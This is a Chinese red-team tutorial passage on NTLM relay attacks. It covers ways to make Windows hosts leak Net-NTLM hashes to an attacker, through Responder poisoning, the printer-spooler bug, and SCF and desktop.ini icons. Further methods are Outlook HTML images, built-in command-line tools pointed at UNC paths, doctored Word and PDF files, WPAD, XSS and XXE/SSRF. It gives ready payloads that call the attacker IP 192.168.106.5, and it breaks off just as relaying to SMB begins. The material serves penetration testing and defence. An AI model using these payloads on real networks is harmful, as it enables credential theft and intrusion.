> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/O1ZZTijzO_6AV1QuernbXA)

目录

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmpzBRMT7qaDicmTpBibmXWqLPzNzib2WicSiclPk5CNfgv6oMEwicoSGE7Nsg/640?wx_fmt=jpeg)

作者：谢公子 @深蓝攻防实验室

招聘：[关于红队成长的分享【招聘贴】](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247488420&idx=1&sn=98588ec58a25ac0135905e29d8895929&chksm=eaad9399ddda1a8f7112a173c949ecc5cf948508c4d7a3831d479c7615aa8299fd246d36cfd2&scene=21#wechat_redirect)

* * *

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCgc1Mb9K70qavG1nWrCiaZTEiaYbTNLOM1K5au6FhciaBSlE3DbnuE6pPqVoKz79dpMkZeCU7v9SV9oQ/640?wx_fmt=png)

NTLM Relay 其实严格意义上并不能叫 NTLM Relay，而是应该叫 Net-NTLM Relay。它是发生在 NTLM 认证的第三步，在 Type3 Response 消息中存在 Net-NTLM Hash，当攻击者获得了 Net-NTLM Hash 后，可以进行中间人攻击，重放 Net-NTLM Hash，这种攻击手法也就是大家所说的 **NTLM Relay(NTLM 中继)** 攻击。

进行 NTLM Relay 攻击有两步：

*   第一步是捕获 Net-NTLM Hash
    
*   第二步是重放 Net-NTLM Hash
    

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCgc1Mb9K70qavG1nWrCiaZTEiaYbTNLOM1K5au6FhciaBSlE3DbnuE6pPqVoKz79dpMkZeCU7v9SV9oQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiaWtRttKahE4rd7icPBW6mLiaUbF4gIbibUXe6IU015PNuHGhvHTbQ7HKX6ugMeJqKy7PMvFp2nhbxvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiaWtRttKahE4rd7icPBW6mLiahpj94noZbcm32MmQfloC0I2AcjPTFuLyJ9dF7FVmBlr9veIQ5JefbA/640?wx_fmt=png)

捕获 Net-NTLM Hash

捕获 Net-NTLM Hash 又有两步：

*   第一步是需要使目标服务器向攻击者发起 NTLM 请求
    
*   第二步是使用工具来捕获服务器发来的 NTLM 请求
    

那么如何能使目标服务器向攻击者发起 NTLM 请求呢？思路是让受害者自己把 Net-NTLM Hash 发送给攻击者，也就是说只要是使用 SMB、HTTP、LDAP、MSSQL 等协议来进行 NTLM 认证的程序，都可以尝试用来向攻击者发送 Net-NTLM Hash。比如浏览器、office word 文档、pdf 文档、explorer 等。如果新发现一个这类应用程序，或者发现这些程序的一种调用方法，就会多出一种攻击手段。几种常见的获取方法如下：

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

NBNS&LLMNR

NBNS 和 LLMNR 是 Microsoft 针对工作组和域设计的名称解析协议，主要用于局域网中的名称解析。当 DNS 解析失败时，Windows 系统会使用 NetBIOS 和 LLMNR 搜索名称。这些协议只为本地连接设计。NetBIOS 和 LLMNR 在 WindowsVista 以后的系统中均实现，二者的主要区别在于：

*   NetBIOS 基于广播，而 LLMNR 基于多播；
    
*   NetBIOS 在 WindowsNT 以后的所有操作系统上均可用，而只有 WindowsVista 和更高版本才支持 LLMNR；
    

*   LLMNR 还支持 IPv6，而 NetBIOS 不支持，因此，在启用了 IPv6，但对 IPv6 管理不如 IPv4 那样细致的复杂网络中，就可能发生更广泛的攻击
    

**LLMNR**

LLMNR(Link-LocalMulticast NameResolution)：链路本地多播名称解析 (LLMNR)，是一个基于协议域名系统(DNS) 数据包的格式。使得两者的 IPv4 和 IPv6 的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS。监听的端口为 UDP/5355，支持 IPv4 和 IPv6。当主机访问另外一台主机时，如果只知道对方的主机名，则会向局域网内多播请求，询问该主机名对应的 ip 地址，然后收到该请求的主机首先会判断自己的主机名是否是这个，如果是的话，则会回复一个 ip 地址，如果主机名不符合，则丢弃。LLMNR 协议就类似于 ARP 协议。其解析名称的特点为端到端，IPv4 的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmplEq8U4VtXiaazAbCoNe3yDusUxY56QPJau05ppJ7kWFHafBecF7Zicg/640?wx_fmt=png)**NBNS**

Netbios(Network Basic Input Output System)：网络基本输入输出系统，NetBIOS 协议是由 IBM 公司开发，主要用于 20-200 台计算机的局域网。NBNS 通过 UDP137 端口进行通信，仅支持 IPV4 不支持 IPV6。NBNS 是一种应用程序接口 (API)，系统可以利用 WINS 服务、广播及 Lmhost 文件等多种模式将 NetBIOS 名解析为相应 IP 地址，几乎所有的局域网都是在 NetBIOS 协议的基础上工作的。在 Windows 操作系统中，默认情况下在安装 TCP/IP 协议后会自动安装 NetBIOS。NetBIOS 协议进行名称解析的过程如下：

*   检查本地 NetBIOS 缓存
    
*   如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求
    

*   如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播
    
*   如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件
    

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmnIaC7I7iak7P8Nk54e9kfVkfPJaCUtyVIupgOp6Cx2vV5lrLzYkicXBA/640?wx_fmt=png)

Windows 系统的名称解析顺序如下：

*   本地 hosts 文件（%windir%\System32\drivers\etc\hosts）
    
*   DNS 缓存 / DNS 服务器
    

*   链路本地多播名称解析（LLMNR）和 NetBIOS 名称服务（NBTNS）
    

因此只要用户输入一个不能解析的名称，由于本地 hosts 文件和 DNS 均不能正常解析该名称。于是会发送 LLMNR/NBT-NS 数据包请求解析，攻击者收到请求后告诉客户端它是该名称并要求客户端发送 Net-NTLMHash 进行认证，于是攻击者就可以收到客户端发来的 Net-NTLMHash 了。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmNJ9HFHSfXSiaj0hbWUOIrx0ia76GSwrtQUHKHaD9lB8GXmEtk3CmRovg/640?wx_fmt=png)

```
responder -I eth0 -rPv
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmiaYGYaFgD1libp6ZK7X6gIicicQsZ215bDJf6icDHc5xlFGnz4oRC5COU1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmyrD46IGjGb4VUgyFThsWU1LBOymibicPib4Fl5AFcFkmCDu95VG7fSI1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmY1KEicjwNgFMicouMPJVzEHp8bHZExbRuFejcbSxtOA1kibts8yqFLbibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

打印机漏洞

Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过 Kerberos 或 NTLM 进行验证）。微软表示这个 bug 是系统设计特点，无需修复。由于打印机是以 system 权限运行的，所以我们访问打印机 RPC，迫使打印机服务向我们发起请求，我们就能拿到目标机器用户的 Net-NTLM Hash。

如下，我们执行 printerbug.py 脚本，使用域内任意用户访问目标机器的打印机服务，此脚本会触发 SpoolService Bug，强制 Windows 主机通过 MS-RPRNRPC 接口向攻击者进行身份验证。因此我们能收到目标机器向我们发送 Net-NTLMHash。在后面我们会讲到利用这个漏洞进行接管域控。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSm4YlwBSMFVUI8gDXacxa5ApibOmh6wf4uiasghmibJuYDfETvqSnAbegibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSm6LJWvVaiaj6hSJlLlzxhAibdib2fN67f5kkPyn7hPORKicox9MFQ1m1jsQ/640?wx_fmt=png)

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

图标

当图标的一些路径属性改成我们的 UNC 路径的话，我们就能收到目标服务器发来的 NTLM 请求。

**desktop.ini**

在每个文件夹底下都有一个隐藏文件 desktop.ini，其作用是指定文件夹的图标之类。可以通过修改文件夹属性——> 隐藏受保护的操作系统文件 (推荐) ，来显示 desktop.ini 文件。

创建一个 test 文件夹，然后修改该文件夹的图标为任何其他

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmpqm0dmic0dpeX940DPJSghGzPiajR3j3mEWiaibXIjnicrQnrvYkrdIamdw/640?wx_fmt=png)

然后修改该文件夹的 隐藏受保护的操作系统文件 (推荐) 属性，取消勾选

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmgncaYkAI7ZgbP8k3SmESmaVt7oKQ8LqHDggNdOZgKDL7ibU1iaMTRpUw/640?wx_fmt=png)

接着就能在 test 文件夹下看到 desktop.ini 文件了

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmic57s1maOK1YCvXKmnaM38JkgYQ8LEXo8v8riclbjHqENuN6EgR6Eq3Q/640?wx_fmt=png)

编辑 desktop.ini 文件

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmQd9wLCWCrEPqWlfoLv3aicQ70H3o1iaxflXKpADJ8NPB1YBVe360Vicyg/640?wx_fmt=png)

将 IconResource 替换为攻击者的 UNC 路径

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmW4jicfNCuaSJ3ZDJibdOzqbM9d0z2rRibRm1EBYgbQ6KMicFkhF3yFJSzA/640?wx_fmt=png)

只要有人访问了 test 文件夹，目标主机就会去请求指定 UNC 的图标资源，于是该主机会将当前用户的 Net-NTLM Hash 发送给指定的机器，我们在该机器上使用 Responder 监听，就能接收到目标机器发来的 Net-NTLM Hash 了。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSm7DQYvOnhdQKzsUA8QadEOOs7N0KibQ1YtBLhSNxUlPyIL8T6zsNvapQ/640?wx_fmt=png)

**用户头像**

该功能适用于 Windows 10、Windows Server 2016/2019。在更改账户图片处，输入指定的 UNC 路径

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmy5dKMwh294iaDNibbTKc79Jiabd1uPZEJkSW8ebXsXHAEM9Mawyticmf6g/640?wx_fmt=png)

我们就能抓到目标机器的当前用户的 Net-NTLM Hash 了。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSml8NQGYxx4AlVc6A4JNC2ziasmhYWX3fgIjOtFhLXsicH3Fnl6VvPGofw/640?wx_fmt=png)

如果是在域内，用普通用户的权限指定一个 webadv 地址的图片，如果普通用户验证图片通过，那么 system 用户 (域内是机器用户) 也会去访问 172.16.100.180，并且携带凭据，我们就可以拿到机器用户的 Net-NTLM Hash，这个可以用来提权

**scf 文件**

只要一个文件夹内含有 scf 后缀的文件，由于 scf 文件包含了 IconFile 属性，所以 explore.exe 会尝试获取文件夹的图标。而 IconFile 是支持 UNC 路径的，所以当打开文件夹的时候，目标主机就会去请求指定 UNC 的图标资源，于是该主机会将当前用户的 NTLM v2 hash 发送给指定的机器，我们在该机器上使用 Responder 监听，就能接收到目标机器发来的 Net-NTLM Hash 了。以下是 scf 后缀的文件的格式：

```
[Shell]
Command=2
IconFile=UNC路径
[Taskbar]
Command=ToggleDesktop
```

创建一个 test 文件夹，在该文件夹内创建 test.scf 文件，文件内容如下：

```
[Shell]
Command=2
IconFile=\\192.168.106.5\test\test.ico
[Taskbar]
Command=ToggleDesktop
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmpnUA0QZoxIOOAibnahhhUfmtzGOzNlfPgRWPpvWfD8RdmICgjHg9V4Q/640?wx_fmt=png)

只要有人访问了 test 文件夹，目标主机就会去请求指定 UNC 的图标资源，于是该主机会将当前用户的 NTLM v2 hash 发送给指定的机器，我们在该机器上使用 Responder 监听，就能接收到目标机器发来的 Net-NTLM Hash 了。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmwaZUx8Q3oSVPCTnjSuYQV0rw1GzMEeDKBW26p29PQ2r5vmq4pozqtQ/640?wx_fmt=png)

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

Outlook

邮件是支持发送 HTML 格式邮件的。于是我们可以发送带有如下 html payload 的邮件：

```
<p>邮件发送测试...</p>
<img src="\\\\192.168.106.5\\test">
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmL7XJGlnFdR4XicPjwBibibp67FWT0hJyMTQMxzyLuPDYrC0iaicrTkibZ94A/640?wx_fmt=png)

当目标使用的是 Windows 机器，并且使用的是 Outlook 客户端打开该邮件的话，我们就能收到目标机器的 Net-NTLM Hash。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmpy2hAtibQnCNtHpmjdaYbDSfV3r9zVXkZvkMs2vdzOm3L0jJOb8c26Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmpvO6Pia1tejh1ulRmXUU9Szxk83agMCyNSamBYN1PKrGZtwLkLs0Tiaw/640?wx_fmt=png)

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

系统命令

通过执行系统命令，访问指定的 UNC 路径，来获取目标机器的 Net-NTLM Hash。

```
net.exe use \hostshare 
attrib.exe \hostshare
cacls.exe \hostshare
certreq.exe \hostshare #(noisy, pops an error dialog) 
certutil.exe \hostshare
cipher.exe \hostshare
ClipUp.exe -l \hostshare
cmdl32.exe \hostshare
cmstp.exe /s \hostshare
colorcpl.exe \hostshare #(noisy, pops an error dialog)
comp.exe /N=0 \hostshare \hostshare
compact.exe \hostshare
control.exe \hostshare
convertvhd.exe -source \hostshare -destination \hostshare
Defrag.exe \hostshare
diskperf.exe \hostshare
dispdiag.exe -out \hostshare
doskey.exe /MACROFILE=\hostshare
esentutl.exe /k \hostshare
expand.exe \hostshare
extrac32.exe \hostshare
FileHistory.exe \hostshare #(noisy, pops a gui)
findstr.exe * \hostshare
fontview.exe \hostshare #(noisy, pops an error dialog)
fvenotify.exe \hostshare #(noisy, pops an access denied error)
FXSCOVER.exe \hostshare #(noisy, pops GUI)
hwrcomp.exe -check \hostshare
hwrreg.exe \hostshare
icacls.exe \hostshare 
licensingdiag.exe -cab \hostshare
lodctr.exe \hostshare
lpksetup.exe /p \hostshare /s
makecab.exe \hostshare
msiexec.exe /update \hostshare /quiet
msinfo32.exe \hostshare #(noisy, pops a "cannot open" dialog)
mspaint.exe \hostshare #(noisy, invalid path to png error)
msra.exe /openfile \hostshare #(noisy, error)
mstsc.exe \hostshare #(noisy, error)
netcfg.exe -l \hostshare -c p -i foo
```

#### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmGDXWEGg3GWTaWhCVL1308UvNIcwg7XAWevwPm5qWHRBLIUaMEQQYlA/640?wx_fmt=png)

#### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSm1xibORxskUgzE79HdiaL3EbtcLx7vrUY7mXLGEwrRwibF9odups7UR9EQ/640?wx_fmt=png)

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

Office  

新建一个 word 文件，插入一张图片

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSms8AGgkBdic9DHUfjSSMEjOxfW8rHM8dASNAYMjQ1LjjqhxU8ulgnupA/640?wx_fmt=png)

用压缩软件打开，进入 test.docx\word\_rels 目录，修改 document.xml.rels 文件

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmdnXH40qBDhxMYiaiapLyoHShXXbxzDcWD9FibQmBdhDiarVIR4IPibqAUSg/640?wx_fmt=png)

可以看到 Target 参数是本地的路径，我们修改为指定的 UNC 路径，然后加上 TargetMode="External"

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmldCibDvAfFFsAYiaHHq1LsFMjWUAXAvib76JayM1icrQA0TsU7W7s5vYjA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmo1a1Xd8tdfElnYGJbZjPPBJ1zcyttX8cgrPZKglCCHicoRePbxq6KGA/640?wx_fmt=png)

只要有人访问了该 word 文档，目标主机就会去请求指定 UNC 的图片资源，于是该主机会将当前用户的 NTLM v2 hash 发送给指定的机器，我们在该机器上使用 Responder 监听，就能接收到目标机器发来的 Net-NTLM Hash 了。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmkT62L6jS7xRkMe4XrgOibgb4PL2rbMJ6giacsVcJousiaKjoDRicuTQ3icA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSm3EuJbdmnXiaHiaIJx2xAM2pBeMMUZ3ZibTMR2S2XRbdh3vwRuUoYyu01w/640?wx_fmt=png)

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

PDF

PDF 文件可以添加一项功能：请求远程 SMB 服务器的文件。于是乎，利用 PDF 文件的正常功能够窃取 Windows 系统的 Net-NTLM Hash。当用户使用 PDF 阅读器打开一份恶意的 PDF 文档，该 PDF 会向远程 SMB 服务器发出请求，如果该远程 SMB 服务器对数据包进行抓取，就能够获得用户 Windows 系统的 Net-NTLM Hash。

如下，使用脚本往正常的 PDF 文件中加入请求远程 SMB 服务器的功能，生成 test.pdf.malicious.pdf 文件。

```
python2 WorsePDF.py test.pdf 192.168.106.5
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmeJYXqZXFGr2WhNxgWokCia6AYOk5WdfPDuKepTVndVvup8uDicpCJiaYQ/640?wx_fmt=png)

经过测试发现，只有使用 Adobe PDF 阅读器才会发收到 Net-NTLM Hash，Chrome、Edge 和 WPS 的 PDF 阅读器不能收到 Net-NTLM Hash。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmYD65ZMXj4znia0ZMczdZ5LB7PUpUZ25e7ibSdx2RBIW1cjxCjXvjsmug/640?wx_fmt=png)

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

WPAD

WPAD(Web Proxy Auto-Discovery Protocol) Web 代理自动发现协议是用来查找 PAC(Proxy Auto-Config) 文件的协议，其主要通过 DHCP、DNS、LLMNR、NBNS 协议来查找存放 PAC 文件的主机。PAC 文件定义了浏览器和其他用户代理如何自动选择适当的代理服务器来访问一个 URL，通俗点说就是 PAC 文件中配置了代理服务器，用户在访问网页时，首先会查询 PAC 文件的位置，然后获取 PAC 文件，将 PAC 文件作为代理配置文件。

浏览器查询 PAC 文件的顺序如下：

1.  通过 DHCP 服务器
    
2.  查询 WPAD 主机的 IP
    

*   Hosts
    
*   DNS (cache / server)
    
*   LLMNR
    
*   NBNS 
    

PAC 文件的格式如下：

```
function FindProxyForURL(url, host) {
   if (url== 'http://www.baidu.com/') return 'DIRECT';
   if (host== 'twitter.com') return 'SOCKS 127.0.0.10:7070';
   if (dnsResolve(host) == '10.0.0.100') return 'PROXY 127.0.0.1:8086;DIRECT';
   return 'DIRECT';
}
```

WPAD 的一般请求流程如下 (图片来源乌云 drop)，WPAD 涉及到两种攻击方式。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSm8DFM0zzGauvHBlvg1yBhr6rSSxBXRaTcoflv9PL4n52wKjCic5rdRTw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmA940LicrEzYAm2UoCGvCiaKMQnhdmVhJQPQ9pdf0iaD4FYxusAOACeRHw/640?wx_fmt=png)

**配合 LLMNR/NBNS 投毒**

一个典型的劫持方式是利用 LLMNR/NBNS 欺骗来让受害者从攻击者获取 PAC 文件，PAC 文件指定攻击者就是代理服务器，然后攻击者就可以劫持受害者的 HTTP 流量，在其中插入任意 HTML 标签。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSm7fyaOgDuFwcfd2aiaBe7mL4wBDcwFunMkPRboOS6tYsu1FXblTZY07A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmIVEIpuVa3sZgcOibXvM6NjW9ic8FHWjXffS3G0SVUJ9RUmkPTyGHGLbQ/640?wx_fmt=png)

IE 浏览器默认是自动检测设置

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmqfy00OYEu1AVhBB7PiaicqOu7jdj4qkvkP7wxSSnnicXsKhNsERekEk9g/640?wx_fmt=png)

1.  用户在访问网页时，由于 IE 浏览器默认是自动检测设置，所以首先会查询 PAC 文件的位置，查询的地址是 WPAD/wpad.dat。如果本地 hosts 文件和 DNS 服务器解析不到这个域名的话，就会使用 LLMNR 发起广播包询问 WPAD 对应的 ip 是多少。
    
2.  受害者通过 LLMNR 询问 WPAD 主机的 ip，Responder 通过 LLMNR 投毒将 WPAD 的 ip 指向 Responder 所在的服务器
    

3.  受害者访问 /wpad.dat(Responder 此时就能获得目标机器的 Net-NTLM Hash，但是这个 Responder 默认不开，因为害怕会有登录提醒，不利于后面的中间人攻击，可以加上 - F 开启)，然后 Responder 通过伪造如下 PAC 文件将代理指向 proxysrv:3141
    
4.  受害者会使用 proxysrv:3141 作为代理，但是受害者不知道 proxysrv 对应的 ip 是什么，所以会再次查询，Responder 再次通过 LLMNR 投毒进行欺骗。将 LLMNR 指向 Responder 本身，然后开始中间人攻击，攻击者可以劫持受害者的 HTTP 流量，在其中插入任意 HTML 标签 (插入 XSS Payload 获取 Net-NTLM Hash) 或者获取 cookie 等其他数据。
    

```
responder -I eth0 -rPvw
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmnayAB4fnskeDRKN90ibCkWrdD7R0WzMPEygnCyRjx97svqKGLzwUxFA/640?wx_fmt=png)

然而，微软在 2016 年发布了 MS16-077 安全公告，添加了两个重要的保护措施，以缓解这类攻击行为：  

*   系统再也无法通过广播协议来解析 WPAD 文件的位置，只能通过使用 DHCP 或 DNS 协议完成该任务。
    
*   更改了 PAC 文件下载的默认行为，以便当 WinHTTP 请求 PAC 文件时，不会自动发送客户端的凭据来响应 NTLM 或协商身份验证质询。
    

**配合 DHCPv6**

如果目标主机打上了 MS16-077 补丁的话，就无法通过 LLMNR/NBNS 欺骗来指定 PAC 文件了。目标机器只可以通过 DHCP 和 DNS 协议来获取 PAC 文件。但是 DHCP 和 DNS 都有指定的服务器，并且大部分情况下 DHCP 服务器和 DNS 服务器我们是不可控的，没法进行投毒，这时候我们就需要用到 IPV6 了。从 Windows Vista 以来，所有的 Windows 系统（包括服务器版系统）都会启用 IPv6 网络，并且优先级要高于 IPv4 网络。这里我们要用到 DHCPV6 协议。在 DHCPv6 协议中，客户端通过向组播地址发送 Solicit 报文来定位 DHCPv6 服务器，组播地址 [ff02::1:2] 包括整个地址链路范围内的所有 DHCPv6 服务器和中继代理。

DHCPv6 四步交互过程如下：

1.  客户端向 [ff02::1:2] 组播地址发送一个 Solicit 请求报文
    
2.  DHCP 服务器或中继代理回应 Advertise 消息告知客户端
    

3.  客户端选择优先级最高的服务器并发送 Request 信息请求分配地址或其他配置信息
    
4.  最后服务器回复包含确认地址，委托前缀和配置（如可用的 DNS 或 NTP 服务器）的 Relay 消息
    

通俗点来说就是，在可以使用 IPV6 的情况下 (Windows Vista 以后默认开启)，攻击者能接收到其他机器的 DHCPv6 组播包，攻击者通过攻击可以让受害者的 IPv6 DNS 设置为攻击者的 IPv6 地址。

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

XSS

当我们能进行 xss 的时候，可以在网页中插入指定的 UNC 路径，来获取目标机器的 Net-NTLM Hash。

```
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
</head>
<body>
</body>
    <script src="\\192.168.106.5\test"></script>
</html>
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSm8qFCXl7VSGfjH1vDkyyR55mQhxnR5BGv7X9zjbz1kCe2s2Rq7tozdw/640?wx_fmt=png)

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

XXE&SSRF

如果目标网站存在 XXE 或者 SSRF 漏洞的话，可以尝试访问指定的 UNC(\\ip\x 或 file://ip/x) 路径或者指定的 HTTP(http://ip/x) 路径，看能否接收到 Net-NTLM Hash。各个语言触发 XXE 和 SSRF 的实现不同，同一门语言也有不同的触发方式，这里就不一一讲了，因为我对各种语言也不熟悉。

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiaWtRttKahE4rd7icPBW6mLiaUbF4gIbibUXe6IU015PNuHGhvHTbQ7HKX6ugMeJqKy7PMvFp2nhbxvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiaWtRttKahE4rd7icPBW6mLiahpj94noZbcm32MmQfloC0I2AcjPTFuLyJ9dF7FVmBlr9veIQ5JefbA/640?wx_fmt=png)

重放 Net-NTLM Hash

在获取到了目标机器的 Net-NTLM Hash 后，我们要怎么利用呢？这里有两种利用方式：

1.  使用 Hashcat 破解 Net-NTLM Hash
    
2.  Relay Net-NTLM Hash
    

本文主要讲如何 Relay Net-NTLM Hash。我们知道，由于 NTLM 只是底层的认证协议，必须镶嵌在上层应用协议里面，消息的传输依赖于使用 NTLM 的上层协议，比如 SMB、HTTP、LDAP 等。因此，我们可以将获取到的 Net-NTLM Hash Relay 到其他使用 NTLM 进行认证的应用上。

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

Relay To SMB

直接 Relay 到 SMB 服务器，是最直接简单的方法。可以直接控制该服务器执行任意命令等操作。

这里根据工作组和域环境，有两种场景：

